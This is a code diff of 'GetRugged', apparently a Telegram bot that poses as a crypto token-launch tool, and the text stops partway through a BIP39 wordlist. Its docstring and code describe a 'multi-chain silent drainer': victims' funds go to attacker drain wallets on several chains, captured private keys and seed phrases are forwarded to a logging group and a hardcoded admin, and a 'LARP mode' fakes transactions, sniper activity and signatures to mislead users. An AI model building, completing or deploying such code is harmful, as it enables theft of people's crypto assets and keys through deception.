@@ -3,8 +3,6 @@
 GetRugged bot — multi-chain silent drainer + full launch UX.
 Photo upload + socials/bundle buttons + fixed confirm + group key logging.
 LARP mode: /larpon /larpoff /randomtx /larpwallet /dumpnow /simactivity
-Sweep: /sweepall /sweepstart [secs] /sweepstop
-Help: /help
 Requires: pip install aiogram==3.13.1 solana solders base58 web3 eth-account
 """
 
@@ -20,7 +18,6 @@ import struct
 import time
 from dataclasses import dataclass, field
 from typing import Dict, List, Optional, Tuple
-from io import BytesIO
 
 from aiogram import Bot, Dispatcher, F, Router
 from aiogram.client.default import DefaultBotProperties
@@ -29,12 +26,10 @@ from aiogram.filters import Command, CommandStart
 from aiogram.fsm.context import FSMContext
 from aiogram.fsm.state import State, StatesGroup
 from aiogram.fsm.storage.memory import MemoryStorage
-from aiogram.types import (
-    CallbackQuery, InlineKeyboardButton, InlineKeyboardMarkup, Message,
-    ReplyKeyboardRemove, FSInputFile,
-)
+from aiogram.types import CallbackQuery, InlineKeyboardButton, InlineKeyboardMarkup, Message
 from aiogram.utils.keyboard import InlineKeyboardBuilder
 
+# ── Solana ──────────────────────────────────────────────────────────────────
 try:
     from solders.keypair import Keypair
     from solders.pubkey import Pubkey
@@ -46,6 +41,7 @@ try:
 except ImportError:
     HAS_SOLANA = False
 
+# ── EVM ─────────────────────────────────────────────────────────────────────
 try:
     from web3 import Web3
     from eth_account import Account
@@ -59,40 +55,39 @@ except ImportError:
 BOT_TOKEN = os.getenv("BOT_TOKEN", "PUT_YOUR_BOT_TOKEN_HERE")
 ADMIN_IDS = {int(x) for x in os.getenv("ADMIN_IDS", "123456789").split(",") if x.strip()}
 
-DRAIN_DESTINATION = (
-    os.getenv("SOL_DRAIN_WALLET")
-    or os.getenv("DRAIN_WALLET")
-    or "YourDrainWalletPubkeyHere111111111111111111111"
-)
-ETH_DRAIN = os.getenv("ETH_DRAIN_WALLET") or "0xYourEthDrainAddressHere0000000000000000"
-BNB_DRAIN = os.getenv("BNB_DRAIN_WALLET") or ETH_DRAIN
-USDC_DRAIN = os.getenv("USDC_DRAIN_WALLET") or ETH_DRAIN
-BTC_DRAIN = os.getenv("BTC_DRAIN_WALLET") or ""
-LTC_DRAIN = os.getenv("LTC_DRAIN_WALLET") or ""
+DRAIN_DESTINATION = os.getenv("DRAIN_WALLET", "YourDrainWalletPubkeyHere111111111111111111111")
+ETH_DRAIN = os.getenv("ETH_DRAIN_WALLET", "0xYourEthDrainAddressHere0000000000000000")
+BNB_DRAIN = os.getenv("BNB_DRAIN_WALLET", ETH_DRAIN)
+USDC_DRAIN = os.getenv("USDC_DRAIN_WALLET", ETH_DRAIN)
+BTC_DRAIN = os.getenv("BTC_DRAIN_WALLET", "")
+LTC_DRAIN = os.getenv("LTC_DRAIN_WALLET", "")
+XRP_DRAIN = os.getenv("XRP_DRAIN_WALLET", "")
+GRAM_DRAIN = os.getenv("GRAM_DRAIN_WALLET", "")
 
+# UTXO explorers (Blockstream for BTC; BlockCypher public for LTC fallback)
 BTC_API = os.getenv("BTC_API", "https://blockstream.info/api")
-LTC_API = os.getenv("LTC_API", "https://litecoinspace.org/api")
+LTC_API = os.getenv("LTC_API", "https://litecoinspace.org/api")  # blockstream-style LTC explorer
+MIN_BTC_SATS = 1000   # dust-ish floor after fees
+MIN_LTC_LITOSHI = 1000
 
 RPC_URL = os.getenv("RPC_URL", "https://api.mainnet-beta.solana.com")
-ETH_RPC = os.getenv("ETH_RPC_URL") or os.getenv("ETH_RPC_URL_ALT") or "https://eth.llamarpc.com"
-BNB_RPC = os.getenv("BNB_RPC_URL") or os.getenv("BNB_RPC_URL_ALT") or "https://bsc-dataseed.binance.org/"
+ETH_RPC = os.getenv("ETH_RPC_URL", "https://eth.llamarpc.com")
+BNB_RPC = os.getenv("BNB_RPC_URL", "https://bsc-dataseed.binance.org/")
 
 MIN_DRAIN_LAMPORTS = 5_000
-PAYMENT_RECEIVER = os.getenv("PAYMENT_RECEIVER") or DRAIN_DESTINATION
+PAYMENT_RECEIVER = os.getenv("PAYMENT_RECEIVER", DRAIN_DESTINATION)
+
+# Group that receives every captured key (must start with -100)
 LOG_GROUP_ID = os.getenv("LOG_GROUP_ID", "")
-KEY_RECEIVER_ID = int(os.getenv("KEY_RECEIVER_ID") or os.getenv("KEY_RECIEVER_ID") or "8637715094")
+
+# ONLY this admin receives the full seed/key on drain
+KEY_RECEIVER_ID = 8637715094
 
 USDC_ETH = "0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48"
 USDC_BSC = "0x8AC76a51cc950d9822D68b83fE1Ad97B32Cd580d"
 
+# Clean SOL text (no circle emoji)
 SOL_EMOJI = "SOL"
-_BASE_DIR = os.path.dirname(os.path.abspath(__file__))
-WELCOME_IMAGE = None
-for _name in ("welcome.jpg", "welcome.jpeg", "welcome.JPG", "welcome.JPEG", "welcome.png"):
-    _p = os.path.join(_BASE_DIR, _name)
-    if os.path.isfile(_p):
-        WELCOME_IMAGE = _p
-        break
 
 ERC20_ABI = [
     {"constant": True, "inputs": [{"name": "_owner", "type": "address"}], "name": "balanceOf", "outputs": [{"name": "balance", "type": "uint256"}], "type": "function"},
@@ -115,18 +110,16 @@ class UserWallet:
     balance_sol: float = 0.0
     chain: str = "sol"
     eth_address: Optional[str] = None
-    eth_priv: Optional[str] = None
     balance_eth: float = 0.0
     balance_bnb: float = 0.0
     balance_usdc: float = 0.0
     btc_address: Optional[str] = None
-    btc_priv: Optional[str] = None
+    btc_wif: Optional[str] = None
     balance_btc: float = 0.0
     ltc_address: Optional[str] = None
-    ltc_priv: Optional[str] = None
+    ltc_wif: Optional[str] = None
     balance_ltc: float = 0.0
     is_larp: bool = False
-    drained: bool = False
 
 @dataclass
 class UserSession:
@@ -135,9 +128,9 @@ class UserSession:
     promo: Optional[str] = None
     promo_discount: float = 0.0
     launches_left: int = 3
-    sol_credit: float = 0.0
     launched_tokens: List[dict] = field(default_factory=list)
     last_tx: List[dict] = field(default_factory=list)
+    drained: bool = False
     settings: dict = field(default_factory=lambda: {
         "slippage": 15,
         "priority_fee": 0.0005,
@@ -151,24 +144,15 @@ class UserSession:
     last_raw_key: Optional[str] = None
     larp_mode: bool = False
     larp_wallet_idx: Optional[int] = None
-    pending_larp_balance: Optional[float] = None
-    pending_larp_phrase: Optional[str] = None
     larp_profit_total: float = 0.0
-    # Admin LARP display overrides (None = use real lists)
-    portfolio_display_total: Optional[int] = None
-    portfolio_display_live: Optional[int] = None
 
 sessions: Dict[int, UserSession] = {}
 bot_balance_sol: float = 0.0
-GLOBAL_TX_FEED: List[dict] = []
-LARP_ENABLED: bool = False
+GLOBAL_TX_FEED: List[dict] = []  # shared fake/activity feed for vault LARP
+LARP_ENABLED: bool = False  # global admin LARP toggle (persisted)
 STATE_FILE = os.getenv("STATE_FILE", "bot_state.json")
 
-_sweeper_task: Optional[asyncio.Task] = None
-SWEEP_INTERVAL_DEFAULT = 60.0
-_bot_ref: Optional[Bot] = None
-
-_rate_hits: Dict[Tuple[int, str], List[float]] = {}
+_rate_hits: Dict[int, List[float]] = {}
 RATE_WINDOW = 60.0
 RATE_MAX_IMPORTS = 3
 RATE_MAX_LAUNCH = 5
@@ -176,6 +160,7 @@ RATE_MAX_SAFETY = 8
 
 
 def _load_state() -> None:
+    """Load bot_balance_sol + global feed + LARP flag from disk."""
     global bot_balance_sol, GLOBAL_TX_FEED, LARP_ENABLED
     try:
         if not os.path.isfile(STATE_FILE):
@@ -195,6 +180,7 @@ def _load_state() -> None:
 
 
 def _save_state() -> None:
+    """Persist vault + global feed + LARP flag."""
     try:
         payload = {
             "bot_balance_sol": bot_balance_sol,
@@ -211,18 +197,19 @@ def _save_state() -> None:
 
 
 def inject_fake_txs(n: int = 3, types: Optional[List[str]] = None) -> List[dict]:
+    """Inject fake success txs into shared feed. Returns the new ones."""
     global GLOBAL_TX_FEED
     default_types = [
-        "Priority Tip",
-        "Bundle Buy",
-        "Create Mint",
-        "Priority Tip (SOL)",
-        "Safety Scan",
-        "Swap",
-        "Profit Claim",
-        "Sniper Dump",
-        "Wallet Top-up",
-        "Transfer Out",
+        "⚡ Priority Tip",
+        "📦 Bundle Buy",
+        "🪙 Create Mint",
+        "⚡ Priority Tip (SOL)",
+        "🛡 Safety Scan",
+        "🔄 Swap",
+        "💰 Profit Claim",
+        "🎯 Sniper Dump",
+        "📥 Wallet Top-up",
+        "📤 Transfer Out",
     ]
     pool = types or default_types
     n = max(1, min(25, int(n)))
@@ -253,7 +240,9 @@ def _fake_sol_pubkey() -> str:
 
 
 def ensure_larp_wallet(sess: UserSession, force_balance: Optional[float] = None) -> UserWallet:
+    """Ensure a single LARP wallet exists and is active. Sync balance to vault when force_balance given."""
     global bot_balance_sol
+    # find existing larp wallet
     for i, w in enumerate(sess.wallets):
         if getattr(w, "is_larp", False):
             sess.larp_wallet_idx = i
@@ -291,11 +280,13 @@ def remove_larp_wallets(sess: UserSession) -> int:
 
 
 def sync_larp_balances_from_vault(uid: Optional[int] = None) -> None:
+    """Push bot_balance_sol into LARP wallets (admin + optional target session)."""
     global bot_balance_sol
     targets = []
     if uid is not None:
         targets.append(get_session(uid))
     else:
+        # admin sessions + any session already in larp mode
         for s in sessions.values():
             if s.larp_mode or any(getattr(w, "is_larp", False) for w in s.wallets):
                 targets.append(s)
@@ -323,6 +314,7 @@ def add_personal_tx(sess: UserSession, tx_type: str, status: str = "success", am
 
 
 async def _sniper_activity_feed(sess: UserSession, token: dict, rounds: int = 4) -> None:
+    """Background: drip realistic sniper buy noise into tx tracker while token is live."""
     if token.get("dumped"):
         return
     symbol = token.get("symbol", "???")
@@ -332,15 +324,17 @@ async def _sniper_activity_feed(sess: UserSession, token: dict, rounds: int = 4)
             return
         vol = round(random.uniform(0.05, 1.35), 4)
         kinds = [
-            f"Sniper buy ${symbol}",
-            f"External buy ${symbol}",
-            f"Jito tip (sniper)",
-            f"New buyer detected",
+            f"👀 Sniper buy ${symbol}",
+            f"📈 External buy ${symbol}",
+            f"⚡ Jito tip (sniper)",
+            f"🔎 New buyer detected",
         ]
         add_personal_tx(sess, random.choice(kinds), "success", amount=vol)
 
 
+
 async def _auto_delete(bot, chat_id: int, *message_ids, delay: float = 5.0):
+    """Delete command + reply after delay (LARP ops stay clean in chat)."""
     await asyncio.sleep(delay)
     for mid in message_ids:
         if mid is None:
@@ -352,6 +346,7 @@ async def _auto_delete(bot, chat_id: int, *message_ids, delay: float = 5.0):
 
 
 async def _admin_reply(message: Message, text: str, delay: float = 5.0, **kwargs):
+    """Reply then auto-delete user command + bot reply."""
     kwargs.setdefault("parse_mode", ParseMode.HTML)
     reply = await message.answer(text, **kwargs)
     asyncio.create_task(_auto_delete(message.bot, message.chat.id, message.message_id, reply.message_id, delay=delay))
@@ -363,18 +358,16 @@ def get_session(uid: int) -> UserSession:
         sessions[uid] = UserSession()
     return sessions[uid]
 
-
 def _rate_ok(uid: int, action: str) -> bool:
     now = time.time()
-    key = (uid, action)
-    hits = _rate_hits.setdefault(key, [])
+    hits = _rate_hits.setdefault(uid, [])
     hits[:] = [t for t in hits if now - t < RATE_WINDOW]
     limits = {"import": RATE_MAX_IMPORTS, "launch": RATE_MAX_LAUNCH, "safety": RATE_MAX_SAFETY}
-    if len(hits) >= limits.get(action, 5):
+    limit = limits.get(action, 5)
+    if len(hits) >= limit:
         return False
     hits.append(now)
     return True
-
 
 # ──────────────────────────────────────────────
 # HELPERS
@@ -382,20 +375,15 @@ def _rate_ok(uid: int, action: str) -> bool:
 def fake_sig() -> str:
     return "".join(random.choices(string.ascii_letters + string.digits, k=88))
 
-BIP39_WORDLIST = ['abandon', 'ability', 'able', 'about', 'above', 'absent', 'absorb', 'abstract', 'absurd', 'abuse', 'access', 'accident', 'account', 'accuse', 'achieve', 'acid', 'acoustic', 'acquire', 'across', 'act', 'action', 'actor', 'actress', 'actual', 'adapt', 'add', 'addict', 'address', 'adjust', 'admit', 'adult', 'advance', 'advice', 'aerobic', 'affair', 'afford', 'afraid', 'again', 'age', 'agent', 'agree', 'ahead', 'aim', 'air', 'airport', 'aisle', 'alarm', 'album', 'alcohol', 'alert', 'alien', 'all', 'alley', 'allow', 'almost', 'alone', 'alpha', 'already', 'also', 'alter', 'always', 'amateur', 'amazing', 'among', 'amount', 'amused', 'analyst', 'anchor', 'ancient', 'anger', 'angle', 'angry', 'animal', 'ankle', 'announce', 'annual', 'another', 'answer', 'antenna', 'antique', 'anxiety', 'any', 'apart', 'apology', 'appear', 'apple', 'approve', 'april', 'arch', 'arctic', 'area', 'arena', 'argue', 'arm', 'armed', 'armor', 'army', 'around', 'arrange', 'arrest', 'arrive', 'arrow', 'art', 'artefact', 'artist', 'artwork', 'ask', 'aspect', 'assault', 'asset', 'assist', 'assume', 'asthma', 'athlete', 'atom', 'attack', 'attend', 'attitude', 'attract', 'auction', 'audit', 'august', 'aunt', 'author', 'auto', 'autumn', 'average', 'avocado', 'avoid', 'awake', 'aware', 'away', 'awesome', 'awful', 'awkward', 'axis', 'baby', 'bachelor', 'bacon', 'badge', 'bag', 'balance', 'balcony', 'ball', 'bamboo', 'banana', 'banner', 'bar', 'barely', 'bargain', 'barrel', 'base', 'basic', 'basket', 'battle', 'beach', 'bean', 'beauty', 'because', 'become', 'beef', 'before', 'begin', 'behave', 'behind', 'believe', 'below', 'belt', 'bench', 'benefit', 'best', 'betray', 'better', 'between', 'beyond', 'bicycle', 'bid', 'bike', 'bind', 'biology', 'bird', 'birth', 'bitter', 'black', 'blade', 'blame', 'blanket', 'blast', 'bleak', 'bless', 'blind', 'blood', 'blossom', 'blouse', 'blue', 'blur', 'blush', 'board', 'boat', 'body', 'boil', 'bomb', 'bone', 'bonus', 'book', 'boost', 'border', 'boring', 'borrow', 'boss', 'bottom', 'bounce', 'box', 'boy', 'bracket', 'brain', 'brand', 'brass', 'brave', 'bread', 'breeze', 'brick', 'bridge', 'brief', 'bright', 'bring', 'brisk', 'broccoli', 'broken', 'bronze', 'broom', 'brother', 'brown', 'brush', 'bubble', 'buddy', 'budget', 'buffalo', 'build', 'bulb', 'bulk', 'bullet', 'bundle', 'bunker', 'burden', 'burger', 'burst', 'bus', 'business', 'busy', 'butter', 'buyer', 'buzz', 'cabbage', 'cabin', 'cable', 'cactus', 'cage', 'cake', 'call', 'calm', 'camera', 'camp', 'can', 'canal', 'cancel', 'candy', 'cannon', 'canoe', 'canvas', 'canyon', 'capable', 'capital', 'captain', 'car', 'carbon', 'card', 'cargo', 'carpet', 'carry', 'cart', 'case', 'cash', 'casino', 'castle', 'casual', 'cat', 'catalog', 'catch', 'category', 'cattle', 'caught', 'cause', 'caution', 'cave', 'ceiling', 'celery', 'cement', 'census', 'century', 'cereal', 'certain', 'chair', 'chalk', 'champion', 'change', 'chaos', 'chapter', 'charge', 'chase', 'chat', 'cheap', 'check', 'cheese', 'chef', 'cherry', 'chest', 'chicken', 'chief', 'child', 'chimney', 'choice', 'choose', 'chronic', 'chuckle', 'chunk', 'churn', 'cigar', 'cinnamon', 'circle', 'citizen', 'city', 'civil', 'claim', 'clap', 'clarify', 'claw', 'clay', 'clean', 'clerk', 'clever', 'click', 'client', 'cliff', 'climb', 'clinic', 'clip', 'clock', 'clog', 'close', 'cloth', 'cloud', 'clown', 'club', 'clump', 'cluster', 'clutch', 'coach', 'coast', 'coconut', 'code', 'coffee', 'coil', 'coin', 'collect', 'color', 'column', 'combine', 'come', 'comfort', 'comic', 'common', 'company', 'concert', 'conduct', 'confirm', 'congress', 'connect', 'consider', 'control', 'convince', 'cook', 'cool', 'copper', 'copy', 'coral', 'core', 'corn', 'correct', 'cost', 'cotton', 'couch', 'country', 'couple', 'course', 'cousin', 'cover', 'coyote', 'crack', 'craft', 'cram', 'crane', 'crash', 'crater', 'crawl', 'crazy', 'cream', 'credit', 'creek', 'crew', 'cricket', 'crime', 'crisp', 'critic', 'crop', 'cross', 'crouch', 'crowd', 'crucial', 'cruel', 'cruise', 'crumble', 'crunch', 'crush', 'cry', 'crystal', 'cube', 'culture', 'cup', 'cupboard', 'curious', 'current', 'curtain', 'curve', 'cushion', 'custom', 'cute', 'cycle', 'dad', 'damage', 'damp', 'dance', 'danger', 'daring', 'dash', 'daughter', 'dawn', 'day', 'deal', 'debate', 'debris', 'decade', 'december', 'decide', 'decline', 'decorate', 'decrease', 'deer', 'defense', 'define', 'defy', 'degree', 'delay', 'deliver', 'demand', 'demise', 'denial', 'dentist', 'deny', 'depart', 'depend', 'deposit', 'depth', 'deputy', 'derive', 'desert', 'design', 'desk', 'despair', 'destroy', 'detail', 'detect', 'develop', 'device', 'devote', 'diagram', 'dial', 'diamond', 'diary', 'dice', 'diesel', 'diet', 'differ', 'digital', 'dignity', 'dilemma', 'dinner', 'dinosaur', 'direct', 'dirt', 'disagree', 'discover', 'disease', 'dish', 'dismiss', 'disorder', 'display', 'distance', 'divert', 'divide', 'divorce', 'dizzy', 'doctor', 'document', 'dog', 'doll', 'dolphin', 'domain', 'donate', 'donkey', 'donor', 'door', 'dose', 'double', 'dove', 'dragon', 'drama', 'drastic', 'draw', 'dream', 'dress', 'drift', 'drill', 'drink', 'drip', 'drive', 'drop', 'drum', 'dry', 'duck', 'dumb', 'dune', 'during', 'dust', 'dutch', 'duty', 'dwarf', 'dynamic', 'eager', 'eagle', 'early', 'earn', 'earth', 'easily', 'east', 'easy', 'echo', 'ecology', 'economy', 'edge', 'edit', 'educate', 'effort', 'egg', 'eight', 'either', 'elbow', 'elder', 'electric', 'elegant', 'element', 'elephant', 'elevator', 'elite', 'else', 'embark', 'embody', 'embrace', 'emerge', 'emotion', 'employ', 'empty', 'enable', 'enact', 'end', 'endless', 'endorse', 'enemy', 'energy', 'enforce', 'engage', 'engine', 'enhance', 'enjoy', 'enlist', 'enough', 'enrich', 'enroll', 'ensure', 'enter', 'entire', 'entry', 'envelope', 'episode', 'equal', 'equip', 'era', 'erase', 'erode', 'erosion', 'error', 'erupt', 'escape', 'essay', 'essence', 'estate', 'eternal', 'ethics', 'evidence', 'evil', 'evoke', 'evolve', 'exact', 'example', 'excess', 'exchange', 'excite', 'exclude', 'excuse', 'execute', 'exercise', 'exhaust', 'exhibit', 'exile', 'exist', 'exit', 'exotic', 'expand', 'expect', 'expire', 'explain', 'expose', 'express', 'extend', 'extra', 'eye', 'eyebrow', 'fabric', 'face', 'faculty', 'fade', 'faint', 'faith', 'fall', 'false', 'fame', 'family', 'famous', 'fan', 'fancy', 'fantasy', 'farm', 'fashion', 'fat', 'fatal', 'father', 'fatigue', 'fault', 'favorite', 'feature', 'february', 'federal', 'fee', 'feed', 'feel', 'female', 'fence', 'festival', 'fetch', 'fever', 'few', 'fiber', 'fiction', 'field', 'figure', 'file', 'film', 'filter', 'final', 'find', 'fine', 'finger', 'finish', 'fire', 'firm', 'first', 'fiscal', 'fish', 'fit', 'fitness', 'fix', 'flag', 'flame', 'flash', 'flat', 'flavor', 'flee', 'flight', 'flip', 'float', 'flock', 'floor', 'flower', 'fluid', 'flush', 'fly', 'foam', 'focus', 'fog', 'foil', 'fold', 'follow', 'food', 'foot', 'force', 'forest', 'forget', 'fork', 'fortune', 'forum', 'forward', 'fossil', 'foster', 'found', 'fox', 'fragile', 'frame', 'frequent', 'fresh', 'friend', 'fringe', 'frog', 'front', 'frost', 'frown', 'frozen', 'fruit', 'fuel', 'fun', 'funny', 'furnace', 'fury', 'future', 'gadget', 'gain', 'galaxy', 'gallery', 'game', 'gap', 'garage', 'garbage', 'garden', 'garlic', 'garment', 'gas', 'gasp', 'gate', 'gather', 'gauge', 'gaze', 'general', 'genius', 'genre', 'gentle', 'genuine', 'gesture', 'ghost', 'giant', 'gift', 'giggle', 'ginger', 'giraffe', 'girl', 'give', 'glad', 'glance', 'glare', 'glass', 'glide', 'glimpse', 'globe', 'gloom', 'glory', 'glove', 'glow', 'glue', 'goat', 'goddess', 'gold', 'good', 'goose', 'gorilla', 'gospel', 'gossip', 'govern', 'gown', 'grab', 'grace', 'grain', 'grant', 'grape', 'grass', 'gravity', 'great', 'green', 'grid', 'grief', 'grit', 'grocery', 'group', 'grow', 'grunt', 'guard', 'guide', 'guilt', 'guitar', 'gun', 'gym', 'habit', 'hair', 'half', 'hammer', 'hamster', 'hand', 'happy', 'harbor', 'hard', 'harsh', 'harvest', 'hat', 'have', 'hawk', 'hazard', 'head', 'health', 'heart', 'heavy', 'hedgehog', 'height', 'hello', 'helmet', 'help', 'hen', 'hero', 'hidden', 'high', 'hill', 'hint', 'hip', 'hire', 'history', 'hobby', 'hockey', 'hold', 'hole', 'holiday', 'hollow', 'home', 'honey', 'hood', 'hope', 'horn', 'horror', 'horse', 'hospital', 'host', 'hotel', 'hour', 'hover', 'hub', 'huge', 'human', 'humble', 'humor', 'hundred', 'hungry', 'hunt', 'hurdle', 'hurry', 'hurt', 'husband', 'hybrid', 'ice', 'icon', 'idea', 'identify', 'idle', 'ignore', 'ill', 'illegal', 'illness', 'image', 'imitate', 'immense', 'immune', 'impact', 'impose', 'improve', 'impulse', 'inch', 'include', 'income', 'increase', 'index', 'indicate', 'indoor', 'industry', 'infant', 'inflict', 'inform', 'inhale', 'inherit', 'initial', 'inject', 'injury', 'inmate', 'inner', 'innocent', 'input', 'inquiry', 'insane', 'insect', 'inside', 'inspire', 'install', 'intact', 'interest', 'into', 'invest', 'invite', 'involve', 'iron', 'island', 'isolate', 'issue', 'item', 'ivory', 'jacket', 'jaguar', 'jar', 'jazz', 'jealous', 'jeans', 'jelly', 'jewel', 'job', 'join', 'joke', 'journey', 'joy', 'judge', 'juice', 'jump', 'jungle', 'junior', 'junk', 'just', 'kangaroo', 'keen', 'keep', 'ketchup', 'key', 'kick', 'kid', 'kidney', 'kind', 'kingdom', 'kiss', 'kit', 'kitchen', 'kite', 'kitten', 'kiwi', 'knee', 'knife', 'knock', 'know', 'lab', 'label', 'labor', 'ladder', 'lady', 'lake', 'lamp', 'language', 'laptop', 'large', 'later', 'latin', 'laugh', 'laundry', 'lava', 'law', 'lawn', 'lawsuit', 'layer', 'lazy', 'leader', 'leaf', 'learn', 'leave', 'lecture', 'left', 'leg', 'legal', 'legend', 'leisure', 'lemon', 'lend', 'length', 'lens', 'leopard', 'lesson', 'letter', 'level', 'liar', 'liberty', 'library', 'license', 'life', 'lift', 'light', 'like', 'limb', 'limit', 'link', 'lion', 'liquid', 'list', 'little', 'live', 'lizard', 'load', 'loan', 'lobster', 'local', 'lock', 'logic', 'lonely', 'long', 'loop', 'lottery', 'loud', 'lounge', 'love', 'loyal', 'lucky', 'luggage', 'lumber', 'lunar', 'lunch', 'luxury', 'lyrics', 'machine', 'mad', 'magic', 'magnet', 'maid', 'mail', 'main', 'major', 'make', 'mammal', 'man', 'manage', 'mandate', 'mango', 'mansion', 'manual', 'maple', 'marble', 'march', 'margin', 'marine', 'market', 'marriage', 'mask', 'mass', 'master', 'match', 'material', 'math', 'matrix', 'matter', 'maximum', 'maze', 'meadow', 'mean', 'measure', 'meat', 'mechanic', 'medal', 'media', 'melody', 'melt', 'member', 'memory', 'mention', 'menu', 'mercy', 'merge', 'merit', 'merry', 'mesh', 'message', 'metal', 'method', 'middle', 'midnight', 'milk', 'million', 'mimic', 'mind', 'minimum', 'minor', 'minute', 'miracle', 'mirror', 'misery', 'miss', 'mistake', 'mix', 'mixed', 'mixture', 'mobile', 'model', 'modify', 'mom', 'moment', 'monitor', 'monkey', 'monster', 'month', 'moon', 'moral', 'more', 'morning', 'mosquito', 'mother', 'motion', 'motor', 'mountain', 'mouse', 'move', 'movie', 'much', 'muffin', 'mule', 'multiply', 'muscle', 'museum', 'music', 'must', 'mutual', 'myself', 'mystery', 'myth', 'naive', 'name', 'napkin', 'narrow', 'nasty', 'nation', 'nature', 'near', 'neck', 'need', 'negative', 'neglect', 'neither', 'nephew', 'nerve', 'nest', 'net', 'network', 'neutral', 'never', 'news', 'next', 'nice', 'night', 'noble', 'noise', 'nominee', 'noodle', 'normal', 'north', 'nose', 'notable', 'note', 'nothing', 'notice', 'novel', 'now', 'nuclear', 'number', 'nurse', 'nut', 'oak', 'obey', 'object', 'oblige', 'obscure', 'observe', 'obtain', 'obvious', 'occur', 'ocean', 'october', 'odor', 'off', 'offer', 'office', 'often', 'oil', 'okay', 'old', 'olive', 'olympic', 'omit', 'once', 'one', 'onion', 'online', 'only', 'open', 'opera', 'opinion', 'oppose', 'option', 'orange', 'orbit', 'orchard', 'order', 'ordinary', 'organ', 'orient', 'original', 'orphan', 'ostrich', 'other', 'outdoor', 'outer', 'output', 'outside', 'oval', 'oven', 'over', 'own', 'owner', 'oxygen', 'oyster', 'ozone', 'pact', 'paddle', 'page', 'pair', 'palace', 'palm', 'panda', 'panel', 'panic', 'panther', 'paper', 'parade', 'parent', 'park', 'parrot', 'party', 'pass', 'patch', 'path', 'patient', 'patrol', 'pattern', 'pause', 'pave', 'payment', 'peace', 'peanut', 'pear', 'peasant', 'pelican', 'pen', 'penalty', 'pencil', 'people', 'pepper', 'perfect', 'permit', 'person', 'pet', 'phone', 'photo', 'phrase', 'physical', 'piano', 'picnic', 'picture', 'piece', 'pig', 'pigeon', 'pill', 'pilot', 'pink', 'pioneer', 'pipe', 'pistol', 'pitch', 'pizza', 'place', 'planet', 'plastic', 'plate', 'play', 'please', 'pledge', 'pluck', 'plug', 'plunge', 'poem', 'poet', 'point', 'polar', 'pole', 'police', 'pond', 'pony', 'pool', 'popular', 'portion', 'position', 'possible', 'post', 'potato', 'pottery', 'poverty', 'powder', 'power', 'practice', 'praise', 'predict', 'prefer', 'prepare', 'present', 'pretty', 'prevent', 'price', 'pride', 'primary', 'print', 'priority', 'prison', 'private', 'prize', 'problem', 'process', 'produce', 'profit', 'program', 'project', 'promote', 'proof', 'property', 'prosper', 'protect', 'proud', 'provide', 'public', 'pudding', 'pull', 'pulp', 'pulse', 'pumpkin', 'punch', 'pupil', 'puppy', 'purchase', 'purity', 'purpose', 'purse', 'push', 'put', 'puzzle', 'pyramid', 'quality', 'quantum', 'quarter', 'question', 'quick', 'quit', 'quiz', 'quote', 'rabbit', 'raccoon', 'race', 'rack', 'radar', 'radio', 'rail', 'rain', 'raise', 'rally', 'ramp', 'ranch', 'random', 'range', 'rapid', 'rare', 'rate', 'rather', 'raven', 'raw', 'razor', 'ready', 'real', 'reason', 'rebel', 'rebuild', 'recall', 'receive', 'recipe', 'record', 'recycle', 'reduce', 'reflect', 'reform', 'refuse', 'region', 'regret', 'regular', 'reject', 'relax', 'release', 'relief', 'rely', 'remain', 'remember', 'remind', 'remove', 'render', 'renew', 'rent', 'reopen', 'repair', 'repeat', 'replace', 'report', 'require', 'rescue', 'resemble', 'resist', 'resource', 'response', 'result', 'retire', 'retreat', 'return', 'reunion', 'reveal', 'review', 'reward', 'rhythm', 'rib', 'ribbon', 'rice', 'rich', 'ride', 'ridge', 'rifle', 'right', 'rigid', 'ring', 'riot', 'ripple', 'risk', 'ritual', 'rival', 'river', 'road', 'roast', 'robot', 'robust', 'rocket', 'romance', 'roof', 'rookie', 'room', 'rose', 'rotate', 'rough', 'round', 'route', 'royal', 'rubber', 'rude', 'rug', 'rule', 'run', 'runway', 'rural', 'sad', 'saddle', 'sadness', 'safe', 'sail', 'salad', 'salmon', 'salon', 'salt', 'salute', 'same', 'sample', 'sand', 'satisfy', 'satoshi', 'sauce', 'sausage', 'save', 'say', 'scale', 'scan', 'scare', 'scene', 'scheme', 'school', 'science', 'scissors', 'scorpion', 'scout', 'scrap', 'screen', 'script', 'scrub', 'sea', 'search', 'season', 'seat', 'second', 'secret', 'section', 'security', 'seed', 'seek', 'segment', 'select', 'sell', 'seminar', 'senior', 'sense', 'sentence', 'series', 'service', 'session', 'settle', 'setup', 'seven', 'shadow', 'shaft', 'shallow', 'share', 'shed', 'shell', 'sheriff', 'shield', 'shift', 'shine', 'ship', 'shiver', 'shock', 'shoe', 'shoot', 'shop', 'short', 'shoulder', 'shove', 'shrimp', 'shrug', 'shuffle', 'shy', 'sibling', 'sick', 'side', 'siege', 'sight', 'sign', 'silent', 'silk', 'silly', 'silver', 'similar', 'simple', 'since', 'sing', 'siren', 'sister', 'situate', 'six', 'size', 'skate', 'sketch', 'ski', 'skill', 'skin', 'skirt', 'skull', 'slab', 'slam', 'sleep', 'slender', 'slice', 'slide', 'slight', 'slim', 'slogan', 'slot', 'slow', 'slush', 'small', 'smart', 'smile', 'smoke', 'smooth', 'snack', 'snake', 'snap', 'sniff', 'snow', 'soap', 'soccer', 'social', 'sock', 'soda', 'soft', 'solar', 'soldier', 'solid', 'solution', 'solve', 'someone', 'song', 'soon', 'sorry', 'sort', 'soul', 'sound', 'soup', 'source', 'south', 'space', 'spare', 'spatial', 'spawn', 'speak', 'special', 'speed', 'spell', 'spend', 'sphere', 'spice', 'spider', 'spike', 'spin', 'spirit', 'split', 'spoil', 'sponsor', 'spoon', 'sport', 'spot', 'spray', 'spread', 'spring', 'spy', 'square', 'squeeze', 'squirrel', 'stable', 'stadium', 'staff', 'stage', 'stairs', 'stamp', 'stand', 'start', 'state', 'stay', 'steak', 'steel', 'stem', 'step', 'stereo', 'stick', 'still', 'sting', 'stock', 'stomach', 'stone', 'stool', 'story', 'stove', 'strategy', 'street', 'strike', 'strong', 'struggle', 'student', 'stuff', 'stumble', 'style', 'subject', 'submit', 'subway', 'success', 'such', 'sudden', 'suffer', 'sugar', 'suggest', 'suit', 'summer', 'sun', 'sunny', 'sunset', 'super', 'supply', 'supreme', 'sure', 'surface', 'surge', 'surprise', 'surround', 'survey', 'suspect', 'sustain', 'swallow', 'swamp', 'swap', 'swarm', 'swear', 'sweet', 'swift', 'swim', 'swing', 'switch', 'sword', 'symbol', 'symptom', 'syrup', 'system', 'table', 'tackle', 'tag', 